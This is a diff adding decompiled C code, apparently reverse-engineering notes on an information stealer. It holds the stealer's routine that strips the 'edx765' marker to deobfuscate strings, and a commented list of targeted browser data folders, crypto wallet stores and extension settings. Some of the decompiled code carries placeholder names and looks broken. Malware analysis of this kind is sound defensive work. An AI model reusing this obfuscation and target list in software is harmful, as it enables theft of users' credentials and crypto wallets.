@@ -51,3 +51,113 @@ char* __fastcall TrasStrings(char* src) {
   strcpy(ptr, src);
   return out;
 }
+
+
+void *GetFilePath(wchar_t *Src)
+{
+  const wchar_t *strStart;
+  int removeCount = 0;
+  wchar_t *currentPos;
+  wchar_t *strEnd;
+  int strLength;
+  wchar_t *matchPos;
+  void *allocatedMem;
+  void *result;
+  _BYTE *memPos;
+  wchar_t *nextMatchPos;
+  int strPartLength;
+  wchar_t currentChar;
+
+  strStart = Src;
+  currentPos = Src;
+  strEnd = Src + 1;
+
+  while (*currentPos++) ;
+
+  strLength = currentPos - strEnd;
+
+  for (matchPos = wcsstr(strStart, L"edx765"); matchPos; matchPos = wcsstr(matchPos + 6, L"edx765"))
+    ++removeCount;
+
+  allocatedMem = malloc((unsigned __int64)(unsigned int)(strLength - 6 * removeCount + 1) >> 31 != 0 ? -1 : 2 * (strLength - 6 * removeCount + 1));
+  result = allocatedMem;
+  
+  if (!allocatedMem)
+    return result;
+
+  memPos = allocatedMem;
+
+  nextMatchPos = wcsstr(strStart, L"edx765");
+  if (nextMatchPos)
+  {
+    do
+    {
+      strPartLength = nextMatchPos - strStart;
+      memset__blabla(memPos, strStart, strPartLength);
+      memPos += 2 * strPartLength;
+      memset__blabla(memPos, &unk_425704, 0);
+      strStart = nextMatchPos + 6;
+      nextMatchPos = wcsstr(strStart, L"edx765");
+    } while (nextMatchPos);
+    result = allocatedMem;
+  }
+
+  // Copy the remaining part of the string
+  strPartLength = memPos - (_BYTE *)strStart;
+  do
+  {
+    currentChar = *strStart;
+    *(const wchar_t *)((char *)strStart + strPartLength) = *strStart;
+    ++strStart;
+  }
+  while (currentChar);
+
+  return result;
+}
+
+
+/*
+
+"Importedx765ant Fileedx765s/Proedx765file"
+"*.edx765txt"
+"%userproedx765file%"
+"Walledx765ets/Binanedx765ce"
+"apedx765p-stoedx765re.jsedx765on"
+"%appdaedx765ta%\\Binaedx765nce"
+"Walledx765ets/Eleedx765ctrum"
+"*edx765"
+"%appdedx765ata%\\Eledx765ectrum\\waledx765lets"
+"Walledx765ets/Ethedx765ereum"
+"keystedx765ore"
+"%appdedx765ata%\\Etheedx765reum"
+"Chredx765ome"
+"%loedx765calappedx765data%\\Goedx765ogle\\Chredx765ome\\Usedx765er Datedx765a"
+"Chromiedx765um"
+"%localappdata%\\Chroedx765mium\\Useedx765r Data"
+"Ededx765ge"
+"%localaedx765ppdata%\\Micedx765rosoft\\Edge\\Usedx765er Data"
+"Komedx765eta"
+"%locedx765alappdaedx765ta%\\Komedx765eta\\Usedx765er Daedx765ta"
+"Vivaedx765ldi"
+"%localedx765appdata%\\Viedx765valdi\\Usedx765er Data"
+"Braedx765ve"
+"%localapedx765pdata%\\Braedx765veSofedx765tware\\Brex765ave-Broedx765wser\\Usedx765er Data"
+"Opedx765era Staedx765ble"
+"%appdedx765ata%\\Opeedx765ra Softedx765ware\\Opedx765era Staedx765ble"
+"Opedx765era Gedx765X Stabedx765le"
+"%appdedx765ata%\\Opedx765era Softwedx765are\\Opedx765era GX Staedx765ble"
+"Opedx765era Neoedx765n"
+"%appdaedx765ta%\\Opedx765era Softwaedx765re\\Opedx765era Neoedx765n\\Usedx765er Daedx765ta"
+"Moziedx765lla Firefedx765ox"
+"%appdaedx765ta%\\Moedx765zilla\\Firedx765efox\\Profedx765iles"
+
+
+=========================================================
+=  the fcking calls 
+
+
+
+
+    lstrcatW(lpString1, GetFilePath(u"\Locedx765al Extensedx765ion Set…"));
+
+*/
